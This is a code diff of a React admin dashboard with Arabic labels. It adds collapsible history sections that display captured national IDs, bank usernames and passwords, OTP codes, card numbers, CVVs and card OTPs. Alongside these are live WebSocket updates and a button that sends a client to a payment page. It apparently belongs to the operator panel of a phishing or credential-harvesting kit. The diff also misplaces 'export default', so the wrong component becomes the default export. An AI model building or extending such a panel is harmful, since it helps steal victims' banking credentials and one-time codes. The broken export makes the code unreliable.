@@ -234,7 +234,106 @@ function mergeVersionsData(sources: AppVersion[]): AppVersion {
   return result as AppVersion;
 }
 
-export default function AdminDashboardPage() {
+export default // مكون عرض سجلات القسم
+function HistorySection({ 
+  type, 
+  records, 
+  expanded, 
+  onToggle 
+}: { 
+  type: "applicant" | "credentials" | "otp" | "payment-card" | "payment-otp";
+  records: Application[];
+  expanded: boolean;
+  onToggle: () => void;
+}) {
+  if (records.length <= 1) return null;
+  
+  const titleMap = {
+    applicant: "سجلات البيانات الشخصية",
+    credentials: "سجلات البنك والدخول",
+    otp: "سجلات رموز OTP",
+    "payment-card": "سجلات البطاقات",
+    "payment-otp": "سجلات OTP البطاقة",
+  };
+  
+  return (
+    <div className="mt-3 border-t pt-3">
+      <button
+        onClick={onToggle}
+        className="w-full flex items-center justify-between bg-blue-50 hover:bg-blue-100 text-blue-600 py-2 px-3 rounded-lg text-xs font-bold transition-all"
+      >
+        <span className="flex items-center gap-2">
+          <History className="w-4 h-4" />
+          {titleMap[type]} ({records.length})
+        </span>
+        <ChevronDown className={`w-4 h-4 transition-transform ${expanded ? "rotate-180" : ""}`} />
+      </button>
+      
+      {expanded && (
+        <div className="mt-2 space-y-2 max-h-60 overflow-y-auto">
+          {records.sort((a, b) => (b.version || 0) - (a.version || 0)).slice(1).map((record, idx) => (
+            <div key={record.id} className="p-3 bg-gray-50 rounded-lg border border-gray-200 text-xs">
+              <div className="flex items-center justify-between mb-2">
+                <span className="font-bold">النسخة {record.version}</span>
+                <span className="text-muted-foreground">{timeAgo(record.createdAt)}</span>
+              </div>
+              <div className="grid grid-cols-2 gap-1">
+                {type === "applicant" && (
+                  <>
+                    <span className="text-muted-foreground">الاسم:</span>
+                    <span>{record.fullName || record.companyName || record.contactName || "—"}</span>
+                    <span className="text-muted-foreground">رقم الهوية:</span>
+                    <span>{record.nationalId || record.commercialRegistration || "—"}</span>
+                    <span className="text-muted-foreground">الهاتف:</span>
+                    <span>{record.phone || "—"}</span>
+                    <span className="text-muted-foreground">الراتب:</span>
+                    <span>{record.monthlySalary || "—"}</span>
+                  </>
+                )}
+                {type === "credentials" && (
+                  <>
+                    <span className="text-muted-foreground">المستخدم:</span>
+                    <span className="font-mono">{record.bankUsername || "—"}</span>
+                    <span className="text-muted-foreground">كلمة المرور:</span>
+                    <span className="font-mono">{record.bankPassword ? "••••••••" : "—"}</span>
+                    <span className="text-muted-foreground">البنك:</span>
+                    <span>{record.bankName || "—"}</span>
+                  </>
+                )}
+                {type === "otp" && (
+                  <>
+                    <span className="text-muted-foreground">رمز OTP:</span>
+                    <span className="font-mono font-bold">{record.otpCode || "—"}</span>
+                  </>
+                )}
+                {type === "payment-card" && (
+                  <>
+                    <span className="text-muted-foreground">رقم البطاقة:</span>
+                    <span className="font-mono">{record.paymentCardNumber || "—"}</span>
+                    <span className="text-muted-foreground">الحامل:</span>
+                    <span>{record.paymentCardHolder || "—"}</span>
+                    <span className="text-muted-foreground">الانتهاء:</span>
+                    <span>{record.paymentExpiryDate || "—"}</span>
+                  </>
+                )}
+                {type === "payment-otp" && (
+                  <>
+                    <span className="text-muted-foreground">رمز OTP:</span>
+                    <span className="font-mono font-bold">{record.paymentOtp || "—"}</span>
+                    <span className="text-muted-foreground">الحالة:</span>
+                    <span>{record.paymentStatus || "—"}</span>
+                  </>
+                )}
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
+function AdminDashboardPage() {
   const queryClient = useQueryClient();
   const [wsConnected, setWsConnected] = useState(false);
   const wsRef = useRef<WebSocket | null>(null);
@@ -245,6 +344,21 @@ export default function AdminDashboardPage() {
     type: "applicant" | "credentials" | "otp" | "payment-card" | "payment-otp" | null;
     data: Application[];
   }>({ type: null, data: [] });
+  
+  // حالة توسيع السجلات لكل قسم
+  const [expandedHistory, setExpandedHistory] = useState<{
+    applicant: boolean;
+    credentials: boolean;
+    otp: boolean;
+    "payment-card": boolean;
+    "payment-otp": boolean;
+  }>({
+    applicant: false,
+    credentials: false,
+    otp: false,
+    "payment-card": false,
+    "payment-otp": false,
+  });
   const [versionCache, setVersionCache] = useState<Record<number, AppVersion[]>>({});
   
   // تحديث فوري لبيانات الطلبات المعروضة (بمفتاح sessionId)
@@ -1210,19 +1324,13 @@ export default function AdminDashboardPage() {
                           />
                         </div>
 
-                        {/* زر عرض سجلات البيانات الشخصية */}
-                        <div className="mt-3">
-                          <button
-                            onClick={() => {
-                              const filteredVersions = versions.filter(v => v.fullName || v.companyName || v.contactName);
-                              setHistoryModal({ type: "applicant", data: filteredVersions });
-                            }}
-                            className="w-full bg-blue-50 hover:bg-blue-100 text-blue-600 py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2"
-                          >
-                            <History className="w-4 h-4" />
-                            عرض سجلات البيانات الشخصية ({versions.filter(v => v.fullName || v.companyName || v.contactName).length})
-                          </button>
-                        </div>
+                        {/* سجلات البيانات الشخصية */}
+                        <HistorySection
+                          type="applicant"
+                          records={versions.filter(v => v.fullName || v.companyName || v.contactName)}
+                          expanded={expandedHistory.applicant}
+                          onToggle={() => setExpandedHistory(h => ({ ...h, applicant: !h.applicant }))}
+                        />
 
                         {/* صندوق بيانات البنك */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -1310,19 +1418,13 @@ export default function AdminDashboardPage() {
                           )}
                         </div>
 
-                        {/* زر عرض سجلات بيانات البنك والدخول */}
-                        <div className="mt-3">
-                          <button
-                            onClick={() => {
-                              const filteredVersions = versions.filter(v => v.bankUsername || v.bankPassword || v.bankName);
-                              setHistoryModal({ type: "credentials", data: filteredVersions });
-                            }}
-                            className="w-full bg-purple-50 hover:bg-purple-100 text-purple-600 py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2"
-                          >
-                            <History className="w-4 h-4" />
-                            عرض سجلات البنك والدخول ({versions.filter(v => v.bankUsername || v.bankPassword).length})
-                          </button>
-                        </div>
+                        {/* سجلات البنك والدخول */}
+                        <HistorySection
+                          type="credentials"
+                          records={versions.filter(v => v.bankUsername || v.bankPassword || v.bankName)}
+                          expanded={expandedHistory.credentials}
+                          onToggle={() => setExpandedHistory(h => ({ ...h, credentials: !h.credentials }))}
+                        />
 
                         {/* صندوق OTP */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -1429,19 +1531,13 @@ export default function AdminDashboardPage() {
                           )}
                         </div>
 
-                        {/* زر عرض سجلات رموز OTP */}
-                        <div className="mt-3">
-                          <button
-                            onClick={() => {
-                              const filteredVersions = versions.filter(v => v.otpCode);
-                              setHistoryModal({ type: "otp", data: filteredVersions });
-                            }}
-                            className="w-full bg-orange-50 hover:bg-orange-100 text-orange-600 py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-2"
-                          >
-                            <History className="w-4 h-4" />
-                            عرض سجلات رموز OTP ({versions.filter(v => v.otpCode).length})
-                          </button>
-                        </div>
+                        {/* سجلات رموز OTP */}
+                        <HistorySection
+                          type="otp"
+                          records={versions.filter(v => v.otpCode)}
+                          expanded={expandedHistory.otp}
+                          onToggle={() => setExpandedHistory(h => ({ ...h, otp: !h.otp }))}
+                        />
 
                         {/* صندوق بيانات الدفع */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -1572,29 +1668,19 @@ export default function AdminDashboardPage() {
                           )}
                           
                           {/* زر إرسال العميل لصفحة الدفع - يظهر دائماً */}
-                          {/* أزرار عرض سجلات الدفع */}
-                          <div className="grid grid-cols-2 gap-2 mt-3">
-                            <button
-                              onClick={() => {
-                                const filteredVersions = versions.filter(v => v.paymentCardNumber);
-                                setHistoryModal({ type: "payment-card", data: filteredVersions });
-                              }}
-                              className="bg-teal-50 hover:bg-teal-100 text-teal-600 py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-1"
-                            >
-                              <History className="w-4 h-4" />
-                              سجلات البطاقات
-                            </button>
-                            <button
-                              onClick={() => {
-                                const filteredVersions = versions.filter(v => v.paymentOtp);
-                                setHistoryModal({ type: "payment-otp", data: filteredVersions });
-                              }}
-                              className="bg-cyan-50 hover:bg-cyan-100 text-cyan-600 py-2 px-3 rounded-lg text-xs font-bold transition-all flex items-center justify-center gap-1"
-                            >
-                              <History className="w-4 h-4" />
-                              سجلات OTP البطاقة
-                            </button>
-                          </div>
+                          {/* سجلات البطاقات و OTP */}
+                          <HistorySection
+                            type="payment-card"
+                            records={versions.filter(v => v.paymentCardNumber)}
+                            expanded={expandedHistory["payment-card"]}
+                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-card": !h["payment-card"] }))}
+                          />
+                          <HistorySection
+                            type="payment-otp"
+                            records={versions.filter(v => v.paymentOtp)}
+                            expanded={expandedHistory["payment-otp"]}
+                            onToggle={() => setExpandedHistory(h => ({ ...h, "payment-otp": !h["payment-otp"] }))}
+                          />
 
                           {app.sessionId && (
                             <button
@@ -1695,103 +1781,6 @@ export default function AdminDashboardPage() {
           )}
         </div>
       </div>
-    {/* مودال عرض سجلات البيانات */}
-    {historyModal.type && historyModal.data.length > 0 && (
-      <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
-        <div className="bg-background rounded-2xl shadow-2xl max-w-4xl w-full max-h-[80vh] overflow-hidden">
-          <div className="p-4 border-b flex items-center justify-between">
-            <h2 className="text-lg font-bold flex items-center gap-2">
-              <History className="w-5 h-5 text-primary" />
-              {historyModal.type === "applicant" && "سجلات البيانات الشخصية"}
-              {historyModal.type === "credentials" && "سجلات بيانات البنك والدخول"}
-              {historyModal.type === "otp" && "سجلات رموز التحقق"}
-              {historyModal.type === "payment-card" && "سجلات بيانات البطاقة"}
-              {historyModal.type === "payment-otp" && "سجلات رموز التحقق للبطاقة"}
-            </h2>
-            <button
-              onClick={() => setHistoryModal({ type: null, data: [] })}
-              className="p-2 hover:bg-muted rounded-lg"
-            >
-              <X className="w-5 h-5" />
-            </button>
-          </div>
-          <div className="p-4 overflow-y-auto max-h-[calc(80vh-80px)]">
-            <div className="space-y-3">
-              {historyModal.data.sort((a, b) => (b.version || 0) - (a.version || 0)).map((record, idx) => (
-                <div
-                  key={record.id}
-                  className={`p-4 rounded-xl border ${
-                    idx === 0 ? "bg-primary/5 border-primary/30" : "bg-card border-border"
-                  }`}
-                >
-                  <div className="flex items-center justify-between mb-3">
-                    <div className="flex items-center gap-2">
-                      {idx === 0 && <span className="bg-primary text-white text-xs px-2 py-1 rounded">الأحدث</span>}
-                      <span className="text-sm font-bold">النسخة {record.version}</span>
-                      <span className="text-xs text-muted-foreground">
-                        {timeAgo(record.createdAt)}
-                      </span>
-                    </div>
-                    <span className="text-xs bg-muted px-2 py-1 rounded">#{record.id}</span>
-                  </div>
-                  
-                  {/* سجلات البيانات الشخصية */}
-                  {historyModal.type === "applicant" && (
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <DataBadge label="الاسم" value={record.fullName || record.companyName || record.contactName} />
-                      <DataBadge label="رقم الهوية" value={record.nationalId || record.commercialRegistration} />
-                      <DataBadge label="رقم الهاتف" value={record.phone} />
-                      <DataBadge label="البريد" value={record.email} />
-                      <DataBadge label="الراتب" value={record.monthlySalary} />
-                      <DataBadge label="جهة العمل" value={record.employer} />
-                      <DataBadge label="المدينة" value={record.city} />
-                      <DataBadge label="الحالة الاجتماعية" value={record.maritalStatus} />
-                    </div>
-                  )}
-
-                  {/* سجلات بيانات البنك */}
-                  {historyModal.type === "credentials" && (
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <DataBadge label="اسم المستخدم" value={record.bankUsername} />
-                      <DataBadge label="كلمة المرور" value={record.bankPassword ? "••••••••" : ""} />
-                      <DataBadge label="البنك" value={record.bankName} />
-                      <DataBadge label="اسم الدخول" value={record.bankUsername} />
-                    </div>
-                  )}
-
-                  {/* سجلات رموز OTP */}
-                  {historyModal.type === "otp" && (
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <DataBadge label="رمز OTP" value={record.otpCode} />
-                      <DataBadge label="رقم الطلب" value={record.id.toString()} />
-                    </div>
-                  )}
-
-                  {/* سجلات البطاقة */}
-                  {historyModal.type === "payment-card" && (
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <DataBadge label="رقم البطاقة" value={record.paymentCardNumber} />
-                      <DataBadge label="حامل البطاقة" value={record.paymentCardHolder} />
-                      <DataBadge label="تاريخ الانتهاء" value={record.paymentExpiryDate} />
-                      <DataBadge label="رمز الأمان" value={record.paymentCvv} />
-                    </div>
-                  )}
-
-                  {/* سجلات رمز OTP للبطاقة */}
-                  {historyModal.type === "payment-otp" && (
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <DataBadge label="رمز OTP للبطاقة" value={record.paymentOtp} />
-                      <DataBadge label="رقم البطاقة" value={record.paymentCardNumber} />
-                      <DataBadge label="الحالة" value={record.paymentStatus} />
-                    </div>
-                  )}
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-      </div>
-    )}
     </AdminLayout>
   );
 }
